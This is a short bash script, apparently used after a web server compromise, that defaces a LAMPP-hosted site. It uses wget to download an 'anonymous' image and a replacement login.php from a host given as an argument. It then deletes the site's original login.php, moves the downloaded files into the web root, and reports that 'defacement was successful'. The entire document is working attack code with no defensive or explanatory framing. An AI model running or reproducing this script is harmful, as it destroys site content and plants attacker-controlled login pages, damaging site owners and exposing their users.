echo "Getting defacement from target machine";
wget http://$1/anonymous.jfif;
mv anonymous.jfif /opt/lampp/htdocs/uploadImage/Logo/anonymous.jfif;
echo "Replacing original home/login page with a defaced website";
rm /opt/lampp/htdocs/login.php;
wget http://$1/login.php;
mv login.php /opt/lampp/htdocs/login.php;
echo "Done, defacement was successful";